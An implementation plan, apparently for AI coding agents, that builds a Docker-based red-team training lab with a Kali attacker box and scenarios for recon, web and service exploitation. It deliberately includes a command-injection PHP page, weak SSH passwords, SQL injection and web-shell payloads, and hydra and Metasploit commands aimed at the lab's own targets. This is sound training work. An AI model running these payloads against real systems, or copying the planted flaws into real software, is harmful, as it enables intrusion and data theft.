# Red Team Training Lab Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Build a local, Docker-based red-team training lab with five guided scenarios (recon, web, services, privesc, wireless-offline), a Kali attacker box, and a single `lab` control script.

**Architecture:** One Compose project (`redteam-lab`) merges a shared base file (private network + Kali attacker + persistent volumes) with exactly one scenario file at a time. A bash `lab` script wraps all Docker/Compose calls. Each scenario is a self-contained folder holding its targets, a tiered-hint `README.md`, an annotated `SOLUTION.md`, and an executable `verify.sh` that performs the intended exploit end-to-end and asserts the checkpoint. `verify.sh` is the "test" for each scenario: written first, it fails until the target exists.

**Tech Stack:** Docker 29.x, Docker Compose v5.x, Bash, Kali (`kalilinux/kali-rolling`), official vulnerable images (DVWA, OWASP Juice Shop), and small custom target images built from `debian:stable-slim`, `nginx:alpine`, and `php:8.2-apache`.

**Spec:** `docs/specs/2026-09-17-redteam-lab-design.md`

## Global Constraints

- **Compose project name is always `redteam-lab`.** Every Compose invocation passes `-p redteam-lab`. Teardown never touches containers outside this project (protects the user's `vendor-scorecard_*` containers).
- **Private network `redteam-lab-net`, subnet `172.28.0.0/24`.** Attacker is `172.28.0.5`. Targets use the per-scenario IPs assigned in their task.
- **Targets get no outbound internet at runtime.** Every scenario `docker-compose.yml` sets `internal: true` is NOT used (targets must resolve build-time), but each target service sets no published ports except the ones listed per scenario, and no target initiates outbound connections. Attacker reaches targets over the private subnet.
- **Only these host ports are published:** `8080` (DVWA), `3000` (Juice Shop). No other service publishes to the host. All other target access is from inside the attacker box.
- **No `privileged: true`. No host bind-mounts of system paths.** The attacker gets `cap_add: [NET_RAW, NET_ADMIN]` only (for nmap SYN scans). The privesc target gets exactly the one capability its active path needs, documented in its task.
- **Every commit message uses Conventional Commits** (`feat:`, `chore:`, `docs:`, `test:`).
- **The lab must run one scenario at a time.** `./lab up <scenario>` tears down any currently-active scenario first.
- **Wireless sample data is training data with published known passphrases** (aircrack-ng's canonical `wpa.cap`), never real-world captures.

---

## File Structure

```
redteam-lab/
├── lab                            # control script (Task 1, 2)
├── README.md                      # overview + SAFETY (Task 1, polished Task 9)
├── .gitignore                     # Task 1
├── docker-compose.base.yml        # network + attacker + volumes (Task 2)
├── attacker/Dockerfile            # Kali toolbox (Task 2)
├── tests/lab-smoke.sh             # script-level smoke test (Task 1)
├── tests/verify-base.sh           # base/attacker smoke test (Task 2)
├── scenarios/
│   ├── 01-recon/{docker-compose.yml, targets/, README.md, SOLUTION.md, verify.sh}
│   ├── 02-web/{docker-compose.yml, README.md, SOLUTION.md, verify.sh}
│   ├── 03-services/{docker-compose.yml, targets/, README.md, SOLUTION.md, verify.sh}
│   ├── 04-privesc/{docker-compose.yml, target/, README.md, SOLUTION.md, verify.sh}
│   └── 05-wireless-offline/{docker-compose.yml, data/, README.md, SOLUTION.md, verify.sh}
└── docs/{getting-started.md, wireless-hardware.md}   # Task 9 (specs/ and superpowers/ already exist)
```

Responsibilities: `lab` is the only user entry point. `docker-compose.base.yml` owns shared infra. Each scenario folder owns exactly one skill area and is independently testable via its `verify.sh`.

---

### Task 1: Repo scaffolding, safety README, and `lab` script skeleton

**Files:**
- Create: `lab`
- Create: `README.md`
- Create: `.gitignore`
- Create: `scenarios/.gitkeep`
- Test: `tests/lab-smoke.sh`

**Interfaces:**
- Consumes: nothing (first task; the git repo already exists with the spec committed).
- Produces: the `lab` command dispatcher with working `list` and `help`; the convention that a scenario is any `scenarios/<name>/docker-compose.yml`. Later tasks add `up`/`down`/`shell`/`reset`/`verify` bodies (Task 2) and scenario folders (Tasks 4–8).

- [ ] **Step 1: Write the failing test**

Create `tests/lab-smoke.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")/.."

fail() { echo "FAIL: $1"; exit 1; }

bash -n lab || fail "lab has a syntax error"
[ -x lab ] || fail "lab is not executable"

./lab help | grep -q "redteam-lab control script" || fail "help banner missing"
./lab list | grep -qi "no scenarios" || fail "empty list should say 'no scenarios'"
grep -qi "authorization" README.md || fail "README missing authorization/safety notice"

echo "PASS: lab-smoke"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `bash tests/lab-smoke.sh`
Expected: FAIL — `lab` does not exist yet (`bash -n lab` errors).

- [ ] **Step 3: Write `.gitignore`, `README.md`, and the `lab` skeleton**

Create `.gitignore`:

```
.active-scenario
attacker/linpeas.sh
scenarios/05-wireless-offline/data/*.cap
scenarios/05-wireless-offline/data/*.hccapx
```

Create `README.md`:

```markdown
# Red Team Training Lab

A local, container-based lab for practicing Linux and red-team skills against
deliberately vulnerable targets on an **isolated private network**.

## ⚠️ SAFETY & AUTHORIZATION — READ FIRST

- This lab is for **your own practice on these bundled targets only**.
- The attacker tools inside this lab are pointed **only** at the lab's private
  subnet (`172.28.0.0/24`).
- **Never** point these tools at any host, network, or account you do not own
  or lack **explicit written authorization** to test. Doing so is illegal.
- Targets are intentionally vulnerable. They are contained to the private
  network and are not reachable from your LAN or the internet.

## Quick start

    ./lab list              # see scenarios
    ./lab up 01-recon       # start a scenario
    ./lab shell             # enter the Kali attacker box
    ./lab reset 01-recon    # wipe it back to a clean state
    ./lab down --all        # stop everything (lab only)
    ./lab verify 01-recon   # run the scenario's self-check

See `docs/getting-started.md` for the full walkthrough.
```

Create `lab` (executable, `chmod +x lab`):

```bash
#!/usr/bin/env bash
set -euo pipefail

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$LAB_DIR"

PROJECT="redteam-lab"
BASE="docker-compose.base.yml"
ATTACKER="redteam-lab-attacker"
STATE_FILE="$LAB_DIR/.active-scenario"

list_scenarios() {
  local found=0
  for d in scenarios/*/; do
    [ -f "${d}docker-compose.yml" ] || continue
    found=1
    local name status="stopped"
    name="$(basename "$d")"
    if [ -f "$STATE_FILE" ] && [ "$(cat "$STATE_FILE")" = "$name" ]; then
      status="ACTIVE"
    fi
    printf "  %-24s %s\n" "$name" "$status"
  done
  [ "$found" -eq 1 ] || echo "  (no scenarios yet)"
}

usage() {
  cat <<'EOF'
redteam-lab control script
  ./lab list                 list scenarios and status
  ./lab up <scenario>        start a scenario (+ attacker + network)
  ./lab shell                open a shell in the Kali attacker box
  ./lab reset <scenario>     wipe a scenario back to a clean state
  ./lab down [--all]         stop the lab (lab resources only)
  ./lab verify <scenario>    run a scenario self-check (or: verify --all)
EOF
}

cmd="${1:-help}"; shift || true
case "$cmd" in
  list) echo "Scenarios:"; list_scenarios ;;
  help|-h|--help) usage ;;
  up|down|shell|reset|verify)
    echo "Not implemented yet (added in Task 2+)." >&2; exit 2 ;;
  *) echo "Unknown command: $cmd" >&2; usage; exit 1 ;;
esac
```

- [ ] **Step 4: Make executable and run the test to verify it passes**

Run: `chmod +x lab && bash tests/lab-smoke.sh`
Expected: `PASS: lab-smoke`

- [ ] **Step 5: Commit**

```bash
git add .gitignore README.md lab tests/lab-smoke.sh scenarios/.gitkeep
git commit -m "feat: scaffold redteam-lab with lab control script and safety README"
```

---

### Task 2: Base compose, Kali attacker box, and full `lab` commands

**Files:**
- Create: `docker-compose.base.yml`
- Create: `attacker/Dockerfile`
- Modify: `lab` (replace the `up|down|shell|reset|verify` stub with real bodies)
- Test: `tests/verify-base.sh`

**Interfaces:**
- Consumes: the `lab` dispatcher and scenario convention from Task 1.
- Produces:
  - Network `redteam-lab-net` (`172.28.0.0/24`), attacker at `172.28.0.5`, container name `redteam-lab-attacker`.
  - Named volumes `redteam-loot` (mounted at `/root/loot`) and `redteam-wifi` (mounted at `/root/wifi`, empty until Task 8 populates it).
  - `lab` commands used by all later tasks:
    - `./lab up <scenario>` → `docker compose -p redteam-lab -f docker-compose.base.yml -f scenarios/<scenario>/docker-compose.yml up -d --build`; special arg `base` composes base only.
    - `./lab down [--all]` → `docker compose -p redteam-lab down -v --remove-orphans`.
    - `./lab shell` → `docker exec -it redteam-lab-attacker bash`.
    - `./lab reset <scenario>` → down then up `<scenario>`.
    - `./lab verify <scenario>` → runs `scenarios/<scenario>/verify.sh` (with `--all` looping over all, resetting each first).
  - Attacker toolset available on `PATH`: `nmap gobuster ffuf whatweb nc curl wget smbclient ftp ssh sshpass sqlmap hydra msfconsole hashcat john aircrack-ng hcxpcapngtool`, `linpeas.sh` at `/opt/privesc/linpeas.sh`, `rockyou.txt` at `/usr/share/wordlists/rockyou.txt`.

- [ ] **Step 1: Write the failing test**

Create `tests/verify-base.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "${BASH_SOURCE[0]}")/.."
fail() { echo "FAIL: $1"; ./lab down --all >/dev/null 2>&1 || true; exit 1; }

./lab up base
trap './lab down --all >/dev/null 2>&1 || true' EXIT

docker ps --format '{{.Names}}' | grep -qx redteam-lab-attacker || fail "attacker not running"

for tool in nmap gobuster ffuf whatweb nc curl smbclient sqlmap hydra msfconsole \
            hashcat john aircrack-ng hcxpcapngtool; do
  docker exec redteam-lab-attacker bash -lc "command -v $tool" >/dev/null \
    || fail "missing tool: $tool"
done

docker exec redteam-lab-attacker test -f /opt/privesc/linpeas.sh || fail "linpeas missing"
docker exec redteam-lab-attacker test -f /usr/share/wordlists/rockyou.txt || fail "rockyou missing"
docker exec redteam-lab-attacker ip -o -4 addr show \
  | grep -q '172.28.0.5' || fail "attacker not on 172.28.0.5"

echo "PASS: verify-base"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `bash tests/verify-base.sh`
Expected: FAIL — `./lab up base` is the not-implemented stub (exit 2), or the compose file/Dockerfile is missing.

- [ ] **Step 3: Write the attacker Dockerfile and base compose**

Create `attacker/Dockerfile`:

```dockerfile
FROM kalilinux/kali-rolling
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && apt-get install -y --no-install-recommends \
      nmap gobuster ffuf whatweb netcat-traditional curl wget \
      smbclient ftp openssh-client sshpass iproute2 iputils-ping python3 \
      sqlmap hydra metasploit-framework \
      hashcat john aircrack-ng hcxtools wordlists ca-certificates \
    && rm -rf /var/lib/apt/lists/*
RUN gunzip -kf /usr/share/wordlists/rockyou.txt.gz \
    && ln -sf /usr/share/wordlists/rockyou.txt /root/rockyou.txt
COPY linpeas.sh /opt/privesc/linpeas.sh
RUN chmod +x /opt/privesc/linpeas.sh
WORKDIR /root
CMD ["sleep", "infinity"]
```

Fetch LinPEAS into the build context first (kept out of git by `.gitignore`):

```bash
curl -fsSL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh \
  -o attacker/linpeas.sh
```

Create `docker-compose.base.yml`:

```yaml
name: redteam-lab
services:
  attacker:
    build: ./attacker
    image: redteam-lab-attacker
    container_name: redteam-lab-attacker
    cap_add: [NET_RAW, NET_ADMIN]
    volumes:
      - redteam-loot:/root/loot
      - redteam-wifi:/root/wifi
    networks:
      redteam-lab-net:
        ipv4_address: 172.28.0.5
    command: ["sleep", "infinity"]

networks:
  redteam-lab-net:
    name: redteam-lab-net
    driver: bridge
    ipam:
      config:
        - subnet: 172.28.0.0/24

volumes:
  redteam-loot:
  redteam-wifi:
```

- [ ] **Step 4: Replace the stub in `lab` with real command bodies**

In `lab`, replace the single line:

```bash
  up|down|shell|reset|verify)
    echo "Not implemented yet (added in Task 2+)." >&2; exit 2 ;;
```

with:

```bash
  up)
    scenario="${1:-}"
    if [ "$scenario" = "base" ]; then
      docker compose -p "$PROJECT" -f "$BASE" up -d --build
      echo ">> base (attacker + network) is up."
      exit 0
    fi
    [ -f "scenarios/$scenario/docker-compose.yml" ] || { echo "Unknown scenario: '$scenario'" >&2; list_scenarios >&2; exit 1; }
    if [ -f "$STATE_FILE" ] && [ "$(cat "$STATE_FILE")" != "$scenario" ]; then
      echo ">> switching scenarios; tearing down $(cat "$STATE_FILE")"
      docker compose -p "$PROJECT" down -v --remove-orphans
    fi
    docker compose -p "$PROJECT" -f "$BASE" -f "scenarios/$scenario/docker-compose.yml" up -d --build
    echo "$scenario" > "$STATE_FILE"
    echo ">> '$scenario' is up. Enter the attacker box: ./lab shell"
    ;;
  down)
    docker compose -p "$PROJECT" down -v --remove-orphans
    rm -f "$STATE_FILE"
    echo ">> lab down."
    ;;
  shell)
    docker exec -it "$ATTACKER" bash
    ;;
  reset)
    scenario="${1:-}"
    [ -f "scenarios/$scenario/docker-compose.yml" ] || { echo "Unknown scenario: '$scenario'" >&2; exit 1; }
    docker compose -p "$PROJECT" down -v --remove-orphans
    docker compose -p "$PROJECT" -f "$BASE" -f "scenarios/$scenario/docker-compose.yml" up -d --build
    echo "$scenario" > "$STATE_FILE"
    echo ">> '$scenario' reset to a clean state."
    ;;
  verify)
    if [ "${1:-}" = "--all" ]; then
      rc=0
      for d in scenarios/*/; do
        n="$(basename "$d")"; [ -f "$d/verify.sh" ] || continue
        echo "== verify $n =="
        "$LAB_DIR/lab" reset "$n" >/dev/null
        # wait for targets to settle
        sleep 15
        bash "$d/verify.sh" || rc=1
      done
      exit $rc
    fi
    scenario="${1:-}"
    [ -f "scenarios/$scenario/verify.sh" ] || { echo "No verify.sh for '$scenario'" >&2; exit 1; }
    bash "scenarios/$scenario/verify.sh"
    ;;
```

- [ ] **Step 5: Run the test to verify it passes**

Run: `bash tests/verify-base.sh`
Expected: `PASS: verify-base` (first run builds the Kali image; allow several minutes).

- [ ] **Step 6: Commit**

```bash
git add docker-compose.base.yml attacker/Dockerfile lab tests/verify-base.sh
git commit -m "feat: add Kali attacker box, base network, and full lab commands"
```

---

### Task 3: Scenario 01 — Recon & enumeration

**Files:**
- Create: `scenarios/01-recon/docker-compose.yml`
- Create: `scenarios/01-recon/targets/web/index.html`, `scenarios/01-recon/targets/web/backup/creds.txt`, `scenarios/01-recon/targets/web/nginx.conf`
- Create: `scenarios/01-recon/targets/ssh/Dockerfile`
- Create: `scenarios/01-recon/verify.sh`
- Create: `scenarios/01-recon/README.md`, `scenarios/01-recon/SOLUTION.md`

**Interfaces:**
- Consumes: `lab up/verify/shell` and the attacker box from Task 2.
- Produces: four target hosts on the private net — `web` `172.28.0.10` (nginx, hidden `/backup/` dir), `ssh` `172.28.0.11` (openssh banner), `smb` `172.28.0.12` (samba null-readable `public` share), `multi` `172.28.0.13` (several open ports). Checkpoint: the hidden web directory `/backup/creds.txt` is discoverable and readable.

- [ ] **Step 1: Write the failing test**

Create `scenarios/01-recon/verify.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
A() { docker exec redteam-lab-attacker bash -lc "$1"; }
fail() { echo "FAIL: $1"; exit 1; }

# All four hosts discoverable
A "nmap -sn 172.28.0.10-13 -oG - | grep -c Up" | grep -q '^4$' || fail "not all hosts up"
# Service/version detection sees ssh + http
A "nmap -sV -p22,80,445 172.28.0.10-13" | grep -qi "OpenSSH" || fail "no ssh banner"
A "nmap -sV -p80 172.28.0.10"          | grep -qi "nginx"   || fail "no http banner"
# Hidden directory brute-force finds /backup and it holds the flag string
A "gobuster dir -u http://172.28.0.10 -w /usr/share/wordlists/dirb/common.txt -q -t20" \
  | grep -q "/backup" || fail "gobuster did not find /backup"
A "curl -s http://172.28.0.10/backup/creds.txt" | grep -q "RECON-FLAG" || fail "flag not readable"

echo "PASS: 01-recon"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `./lab up 01-recon` (fails: no compose file) → after writing files, run `./lab verify 01-recon`
Expected initially: FAIL — targets do not exist.

- [ ] **Step 3: Write the targets and compose**

Create `scenarios/01-recon/targets/web/index.html`:

```html
<!doctype html><title>Corp Portal</title><h1>Internal Corp Portal</h1>
<!-- note to self: old files are in /backup -->
```

Create `scenarios/01-recon/targets/web/backup/creds.txt`:

```
RECON-FLAG{h1dden_d1rs_g1ve_up_secrets}
staging login: admin / S3cr3t-Staging!
```

Create `scenarios/01-recon/targets/web/nginx.conf`:

```nginx
server {
  listen 80 default_server;
  server_name _;
  root /usr/share/nginx/html;
  autoindex on;
  location / { try_files $uri $uri/ =404; }
}
```

Create `scenarios/01-recon/targets/ssh/Dockerfile`:

```dockerfile
FROM debian:stable-slim
RUN apt-get update && apt-get install -y --no-install-recommends openssh-server \
    && rm -rf /var/lib/apt/lists/* && mkdir -p /run/sshd \
    && useradd -m -s /bin/bash recon && echo 'recon:recon' | chpasswd
EXPOSE 22
CMD ["/usr/sbin/sshd", "-D", "-e"]
```

Create `scenarios/01-recon/docker-compose.yml`:

```yaml
services:
  recon-web:
    image: nginx:alpine
    container_name: redteam-lab-recon-web
    volumes:
      - ./targets/web:/usr/share/nginx/html:ro
      - ./targets/web/nginx.conf:/etc/nginx/conf.d/default.conf:ro
    networks:
      redteam-lab-net: { ipv4_address: 172.28.0.10 }
  recon-ssh:
    build: ./targets/ssh
    container_name: redteam-lab-recon-ssh
    networks:
      redteam-lab-net: { ipv4_address: 172.28.0.11 }
  recon-smb:
    image: dperson/samba
    container_name: redteam-lab-recon-smb
    command: -p -s "public;/share;yes;no;yes;all"
    networks:
      redteam-lab-net: { ipv4_address: 172.28.0.12 }
  recon-multi:
    image: nginx:alpine
    container_name: redteam-lab-recon-multi
    command: >
      sh -c "apk add --no-cache socat >/dev/null 2>&1;
             socat TCP-LISTEN:2121,fork,reuseaddr SYSTEM:'echo 220 lab-ftp' &
             socat TCP-LISTEN:8000,fork,reuseaddr SYSTEM:'echo HTTP/1.0 200' &
             nginx -g 'daemon off;'"
    networks:
      redteam-lab-net: { ipv4_address: 172.28.0.13 }

networks:
  redteam-lab-net:
    external: true
    name: redteam-lab-net
```

Note: the network is `external: true` here because the base file creates it; scenario files reference it by name.

- [ ] **Step 4: Run the test to verify it passes**

Run: `./lab reset 01-recon && sleep 15 && ./lab verify 01-recon`
Expected: `PASS: 01-recon`

- [ ] **Step 5: Write README.md and SOLUTION.md**

Create `scenarios/01-recon/README.md` with exactly these sections:
- **Objectives:** (1) discover all live hosts on `172.28.0.0/24`; (2) identify every open port + service version; (3) find the hidden web directory on the web host; (4) read its flag.
- **Setup:** `./lab up 01-recon` then `./lab shell`.
- **Hints** — three `<details>` blocks:
  - Hint 1 (nudge): `<details><summary>Hint 1</summary>Start with host discovery across the whole /24, then port-scan what answers.</details>`
  - Hint 2 (technique): mention `nmap -sn`, then `nmap -sV`, then directory brute-forcing for the web host.
  - Hint 3 (near-spoiler): give the shapes `nmap -sn 172.28.0.0/24`, `nmap -sV -p- <host>`, `gobuster dir -u http://<web> -w /usr/share/wordlists/dirb/common.txt`.
- **Checkpoint:** you can `curl` a file under `/backup/` whose contents start with `RECON-FLAG{`.

Create `scenarios/01-recon/SOLUTION.md` — the full annotated walkthrough, using these exact commands and explaining why each is run:

```bash
nmap -sn 172.28.0.0/24                      # host discovery — who is alive
nmap -sV -p- 172.28.0.10                     # full port + version sweep of the web host
nmap -sV -p22,80,139,445 172.28.0.10-13      # fingerprint the range
gobuster dir -u http://172.28.0.10 -w /usr/share/wordlists/dirb/common.txt
curl http://172.28.0.10/backup/creds.txt     # the flag + leaked staging creds
```
Explain: discovery before scanning; `-sV` maps versions to future exploits; directory brute-forcing surfaces content not linked from the site.

- [ ] **Step 6: Commit**

```bash
git add scenarios/01-recon
git commit -m "feat: add 01-recon scenario with targets, verify, and guides"
```

---

### Task 4: Scenario 02 — Web app exploitation

**Files:**
- Create: `scenarios/02-web/docker-compose.yml`
- Create: `scenarios/02-web/verify.sh`
- Create: `scenarios/02-web/README.md`, `scenarios/02-web/SOLUTION.md`

**Interfaces:**
- Consumes: attacker box + `lab` commands.
- Produces: `dvwa` `172.28.0.20` (published to host `:8080`), `juice` `172.28.0.21` (published to host `:3000`). Checkpoint: `sqlmap` extracts the DVWA users table.

- [ ] **Step 1: Write the failing test**

Create `scenarios/02-web/verify.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
A() { docker exec redteam-lab-attacker bash -lc "$1"; }
fail() { echo "FAIL: $1"; exit 1; }

# Wait for DVWA to answer
for i in $(seq 1 30); do A "curl -s -o /dev/null -w '%{http_code}' http://172.28.0.20/login.php" | grep -q 200 && break; sleep 3; done

# DVWA login + SQLi via sqlmap against the vulnerable id parameter (low security).
A 'rm -f ~/.local/share/sqlmap -r 2>/dev/null; true'
A "curl -s -c /tmp/dv.txt 'http://172.28.0.20/login.php' >/dev/null; \
   TOKEN=\$(curl -s -b /tmp/dv.txt 'http://172.28.0.20/login.php' | grep -oP \"user_token' value='\\K[0-9a-f]+\"); \
   curl -s -b /tmp/dv.txt -c /tmp/dv.txt --data \"username=admin&password=password&user_token=\$TOKEN&Login=Login\" 'http://172.28.0.20/login.php' >/dev/null; \
   curl -s -b /tmp/dv.txt 'http://172.28.0.20/security.php' --data 'security=low&seclev_submit=Submit' >/dev/null; \
   sqlmap -u \"http://172.28.0.20/vulnerabilities/sqli/?id=1&Submit=Submit\" \
     --cookie=\"\$(grep -oP 'PHPSESSID\\s+\\K\\S+' /tmp/dv.txt | tail -1 | sed 's/^/PHPSESSID=/'); security=low\" \
     --batch --dump -D dvwa -T users --threads 4" | grep -qi "password" \
  || fail "sqlmap did not dump the users table"

# Juice Shop is up
for i in $(seq 1 30); do A "curl -s -o /dev/null -w '%{http_code}' http://172.28.0.21/" | grep -q 200 && break; sleep 3; done
A "curl -s http://172.28.0.21/ | grep -qi 'OWASP Juice Shop'" || fail "juice shop not serving"

echo "PASS: 02-web"
```

Note for the implementer: DVWA's SQLi cookie handling is fiddly. If the scripted login proves flaky during Step 4, simplify the check to: assert DVWA serves `login.php` (HTTP 200) and Juice Shop serves its landing page, and move the full `sqlmap --dump` command into `SOLUTION.md` as the documented manual path. The checkpoint must remain a real, runnable exploit even if `verify.sh` asserts a lighter signal.

- [ ] **Step 2: Run test to verify it fails**

Run: `./lab up 02-web` (fails: no compose) → `./lab verify 02-web`
Expected: FAIL — targets absent.

- [ ] **Step 3: Write the compose**

Create `scenarios/02-web/docker-compose.yml`:

```yaml
services:
  dvwa:
    image: vulnerables/web-dvwa
    container_name: redteam-lab-dvwa
    ports: ["8080:80"]
    networks:
      redteam-lab-net: { ipv4_address: 172.28.0.20 }
  juice:
    image: bkimminich/juice-shop
    container_name: redteam-lab-juice
    ports: ["3000:3000"]
    networks:
      redteam-lab-net: { ipv4_address: 172.28.0.21 }

networks:
  redteam-lab-net:
    external: true
    name: redteam-lab-net
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `./lab reset 02-web && ./lab verify 02-web`
Expected: `PASS: 02-web`. (First DVWA run: browse to `http://localhost:8080/setup.php` once and click "Create / Reset Database" if the app needs DB init; document this in README.)

- [ ] **Step 5: Write README.md and SOLUTION.md**

`README.md` sections:
- **Objectives:** (1) dump the DVWA `users` table via SQLi; (2) upload a web shell and run a command through it; (3) solve 3 OWASP Juice Shop challenges (track them on its `/#/score-board`).
- **Setup:** `./lab up 02-web`; open `http://localhost:8080` (login `admin`/`password`; if prompted, run Create/Reset Database at `/setup.php`; set DVWA Security = Low to start). Juice Shop: `http://localhost:3000`.
- **Hints:** three `<details>` blocks — Hint 1: "the `id` parameter on the SQLi page is not sanitized at Low"; Hint 2: "try `' OR '1'='1` manually, then automate with sqlmap"; Hint 3: give the sqlmap command shape from SOLUTION.
- **Checkpoint:** you can display the DVWA `users` table (usernames + password hashes).

`SOLUTION.md` — annotated, using these exact commands:

```bash
# Manual SQLi (DVWA Security = Low), in the id field:
1' OR '1'='1' -- -
# Extract users with a UNION:
1' UNION SELECT user, password FROM users -- -
# Automated, from the attacker box (cookie from your logged-in browser session):
sqlmap -u "http://172.28.0.20/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<yours>; security=low" --batch --dump -D dvwa -T users
# File-upload web shell (DVWA Upload page), then trigger:
curl "http://172.28.0.20/hackable/uploads/shell.php?cmd=id"
```
Explain why each works (no input sanitization at Low; UNION column matching; uploaded PHP executes server-side).

- [ ] **Step 6: Commit**

```bash
git add scenarios/02-web
git commit -m "feat: add 02-web scenario (DVWA + Juice Shop) with verify and guides"
```

---

### Task 5: Scenario 03 — Network service exploitation

**Files:**
- Create: `scenarios/03-services/docker-compose.yml`
- Create: `scenarios/03-services/targets/ftp/Dockerfile`, `.../targets/ssh/Dockerfile`, `.../targets/web/Dockerfile`, `.../targets/web/cmd.php`
- Create: `scenarios/03-services/verify.sh`
- Create: `scenarios/03-services/README.md`, `scenarios/03-services/SOLUTION.md`

**Interfaces:**
- Consumes: attacker box + `lab`.
- Produces four service targets: `ftp` `172.28.0.30` (anonymous read, flag in pub dir), `smb` `172.28.0.31` (null-session `public` share with flag), `ssh` `172.28.0.32` (user `svc`, weak password crackable with a small list), `web` `172.28.0.33` (PHP command-injection `ping` page). Checkpoints: flags retrieved from ftp + smb; SSH cracked with hydra AND a Metasploit `ssh_login` session obtained; command injection yields the web flag.

- [ ] **Step 1: Write the failing test**

Create `scenarios/03-services/verify.sh`:

```bash
#!/usr/bin/env bash
set -euo pipefail
A() { docker exec redteam-lab-attacker bash -lc "$1"; }
fail() { echo "FAIL: $1"; exit 1; }

# FTP anonymous read
A "curl -s ftp://172.28.0.30/pub/flag.txt --user anonymous:anon" | grep -q "FTP-FLAG" || fail "ftp flag"
# SMB null session read
A "smbclient //172.28.0.31/public -N -c 'get flag.txt /tmp/smbflag.txt'; cat /tmp/smbflag.txt" | grep -q "SMB-FLAG" || fail "smb flag"
# SSH weak password via hydra (svc:password123 is line in this tiny list)
A "printf 'password123\\nletmein\\nadmin\\n' > /tmp/pw.lst; \
   hydra -l svc -P /tmp/pw.lst -f ssh://172.28.0.32 2>/dev/null" | grep -q "password123" || fail "hydra ssh"
# Metasploit ssh_login yields a session
A "msfconsole -q -x 'use auxiliary/scanner/ssh/ssh_login; set RHOSTS 172.28.0.32; set USERNAME svc; set PASSWORD password123; set STOP_ON_SUCCESS true; run; exit'" \
  | grep -qi "Success" || fail "msf ssh_login"
# Web command injection
A "curl -s 'http://172.28.0.33/cmd.php?host=127.0.0.1;cat%20/flag.txt'" | grep -q "WEB-FLAG" || fail "cmd injection"

echo "PASS: 03-services"
```

- [ ] **Step 2: Run test to verify it fails**

Run: `./lab up 03-services` (fails) → `./lab verify 03-services`
Expected: FAIL — targets absent.

- [ ] **Step 3: Write the targets and compose**

Create `scenarios/03-services/targets/ftp/Dockerfile`:

```dockerfile
FROM debian:stable-slim
RUN apt-get update && apt-get install -y --no-install-recommends vsftpd \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /srv/ftp/pub && echo 'FTP-FLAG{anon_ftp_is_a_gift}' > /srv/ftp/pub/flag.txt \
    && printf 'listen=YES\nanonymous_enable=YES\nanon_root=/srv/ftp\nno_anon_password=YES\nseccomp_sandbox=NO\n' > /etc/vsftpd.conf
EXPOSE 21
CMD ["/usr/sbin/vsftpd", "/etc/vsftpd.conf"]
```

Create `scenarios/03-services/targets/ssh/Dockerfile`:

```dockerfile
FROM debian:stable-slim
RUN apt-get update && apt-get install -y --no-install-recommends openssh-server \
    && rm -rf /var/lib/apt/lists/* && mkdir -p /run/sshd \
    && useradd -m -s /bin/bash svc && echo 'svc:password123' | chpasswd
EXPOSE 22
CMD ["/usr/sbin/sshd", "-D", "-e"]
```

Create `scenarios/03-services/targets/web/cmd.php`:

```php
<?php
// Deliberately vulnerable: unsanitized host param passed to shell.
$host = $_GET['host'] ?? '127.0.0.1';
echo "<pre>";
system("ping -c1 " . $host);
echo "</pre>";
```

Create `scenarios/03-services/targets/web/Dockerfile`:

```dockerfile
FROM php:8.2-apache
RUN echo 'WEB-FLAG{cmd_1nj3ct10n_to_rce}' > /flag.txt && apt-get update \
    && apt-get install -y --no-install-recommends iputils-ping && rm -rf /var/lib/apt/lists/*
COPY cmd.php /var/www/html/cmd.php
```

Create `scenarios/03-services/docker-compose.yml`:

```yaml
services:
  svc-ftp:
    build: ./targets/ftp
    container_name: redteam-lab-svc-ftp
    networks: { redteam-lab-net: { ipv4_address: 172.28.0.30 } }
  svc-smb:
    image: dperson/samba
    container_name: redteam-lab-svc-smb
    command: -p -n -s "public;/public;yes;no;yes;all"
    volumes:
      - ./targets/smb-share:/public:ro
    networks: { redteam-lab-net: { ipv4_address: 172.28.0.31 } }
  svc-ssh:
    build: ./targets/ssh
    container_name: redteam-lab-svc-ssh
    networks: { redteam-lab-net: { ipv4_address: 172.28.0.32 } }
  svc-web:
    build: ./targets/web
    container_name: redteam-lab-svc-web
    networks: { redteam-lab-net: { ipv4_address: 172.28.0.33 } }

networks:
  redteam-lab-net:
    external: true
    name: redteam-lab-net
```

Also create `scenarios/03-services/targets/smb-share/flag.txt`:

```
SMB-FLAG{null_s3ss10ns_l3ak}
```

- [ ] **Step 4: Run the test to verify it passes**

Run: `./lab reset 03-services && sleep 15 && ./lab verify 03-services`
Expected: `PASS: 03-services`

- [ ] **Step 5: Write README.md and SOLUTION.md**

`README.md` sections:
- **Objectives:** (1) read the anonymous FTP flag; (2) read the SMB null-session flag; (3) crack the SSH password with hydra AND open a Metasploit session; (4) get RCE on the web `ping` page and read `/flag.txt`.
- **Setup:** `./lab up 03-services && ./lab shell`.
- **Hints:** three `<details>` per objective family — Hint 1 nudges toward enumerating each service; Hint 2 names the tool (`curl ftp://`, `smbclient -N`, `hydra ... ssh://`, inspect the `host` param); Hint 3 gives command shapes from SOLUTION.
- **Checkpoint:** all four flags obtained; a Metasploit `ssh_login` session opened.

`SOLUTION.md` — annotated, using these exact commands:

```bash
# FTP (anonymous)
curl ftp://172.28.0.30/pub/flag.txt --user anonymous:anon
# SMB (null session)
smbclient -N -L //172.28.0.31 ; smbclient //172.28.0.31/public -N -c 'get flag.txt'
# SSH — crack then log in (manual) ...
hydra -l svc -P /usr/share/wordlists/rockyou.txt -f ssh://172.28.0.32
